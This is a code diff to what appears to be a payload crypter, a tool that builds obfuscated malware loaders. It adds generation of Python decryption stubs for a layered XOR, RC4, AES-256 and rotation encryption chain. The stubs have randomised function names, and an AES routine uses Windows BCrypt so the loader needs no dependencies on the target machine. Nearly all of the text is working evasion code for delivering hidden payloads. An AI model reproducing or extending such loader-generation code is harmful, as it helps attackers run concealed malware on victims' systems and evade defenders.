@@ -251,6 +251,49 @@ def decryption_stubs_vba(metadata: list[dict]) -> tuple[str, str]:
     return '\n\n'.join(helpers), '\n'.join(calls)
 
 
+def decryption_stubs_py(metadata: list[dict]) -> tuple[str, str]:
+    """
+    Generate Python decryption stubs for the chain.
+
+    Returns:
+      helper_functions – function definitions (module-level, newline-separated)
+      exec_code        – sequential call code decrypting `buf` (4-space indented
+                         so it drops directly into the body of run())
+    """
+    helpers: list[str] = []
+    calls: list[str] = []
+
+    for stage in reversed(metadata):
+        algo = stage['algo']
+
+        if algo == 'xor':
+            fn = _random_fn()
+            key_py = _py_bytes(stage['key'])
+            helpers.append(_PY_XOR_FN.format(fn=fn))
+            calls.append(f'    buf = {fn}(buf, {key_py})')
+
+        elif algo == 'rc4':
+            fn = _random_fn()
+            key_py = _py_bytes(stage['key'])
+            helpers.append(_PY_RC4_FN.format(fn=fn))
+            calls.append(f'    buf = {fn}(buf, {key_py})')
+
+        elif algo == 'aes256':
+            fn = _random_fn()
+            key_py = _py_bytes(stage['key'])
+            iv_py  = _py_bytes(stage['iv'])
+            helpers.append(_PY_AES_FN.format(fn=fn))
+            calls.append(f'    buf = {fn}(buf, {key_py}, {iv_py})')
+
+        elif algo == 'rot':
+            n = (256 - stage['n']) % 256   # inverse rotation
+            fn = _random_fn()
+            helpers.append(_PY_ROT_FN.format(fn=fn))
+            calls.append(f'    buf = {fn}(buf, {n})')
+
+    return '\n\n'.join(helpers), '\n'.join(calls)
+
+
 # ---------------------------------------------------------------------------
 # Internal helpers
 # ---------------------------------------------------------------------------
@@ -268,6 +311,11 @@ def _ps1_key_arr(key: bytes) -> str:
 
 def _cs_key_arr(key: bytes) -> str:
     return '{ ' + ', '.join(f'0x{b:02x}' for b in key) + ' }'
+
+
+def _py_bytes(key: bytes) -> str:
+    """Return a Python bytes literal embedding `key` (repr handles all escaping)."""
+    return repr(key)
 
 
 # ---------------------------------------------------------------------------
@@ -411,3 +459,56 @@ Private Function {fn}(ByRef data() As Byte, ByVal n As Integer) As Byte()
     Next i
     {fn} = r
 End Function"""
+
+
+# ---------------------------------------------------------------------------
+# Python stub templates
+# ---------------------------------------------------------------------------
+
+_PY_XOR_FN = """\
+def {fn}(data, key):
+    kl = len(key)
+    return bytes(data[i] ^ key[i % kl] for i in range(len(data)))"""
+
+_PY_RC4_FN = """\
+def {fn}(data, key):
+    S = list(range(256)); j = 0; kl = len(key)
+    for i in range(256):
+        j = (j + S[i] + key[i % kl]) % 256
+        S[i], S[j] = S[j], S[i]
+    out = bytearray(len(data)); i = j = 0
+    for n in range(len(data)):
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        out[n] = data[n] ^ S[(S[i] + S[j]) % 256]
+    return bytes(out)"""
+
+_PY_ROT_FN = """\
+def {fn}(data, n):
+    return bytes((b + n) % 256 for b in data)"""
+
+# AES-256-CBC decryption via the Windows BCrypt API (ctypes) so the generated
+# loader has no third-party dependency on the target.  PKCS7 padding (BCRYPT_BLOCK_PADDING)
+# matches the encryption side (crypto.aes256_cbc_encrypt).
+_PY_AES_FN = """\
+def {fn}(data, key, iv):
+    import ctypes
+    bcrypt = ctypes.windll.bcrypt
+    hAlg = ctypes.c_void_p()
+    bcrypt.BCryptOpenAlgorithmProvider(
+        ctypes.byref(hAlg), ctypes.create_unicode_buffer('AES'), None, 0)
+    chain = ctypes.create_unicode_buffer('ChainingModeCBC')
+    bcrypt.BCryptSetProperty(hAlg, 'ChainingMode', chain, ctypes.sizeof(chain), 0)
+    hKey = ctypes.c_void_p()
+    kbuf = ctypes.create_string_buffer(key, len(key))
+    bcrypt.BCryptGenerateSymmetricKey(hAlg, ctypes.byref(hKey), None, 0,
+                                      kbuf, len(key), 0)
+    out = ctypes.create_string_buffer(len(data) + 16)
+    outlen = ctypes.c_ulong(0)
+    ivbuf = ctypes.create_string_buffer(iv, 16)
+    bcrypt.BCryptDecrypt(hKey, data, len(data), None, ivbuf, 16,
+                         out, len(out), ctypes.byref(outlen), 1)
+    bcrypt.BCryptDestroyKey(hKey)
+    bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)
+    return ctypes.string_at(out, outlen.value)"""
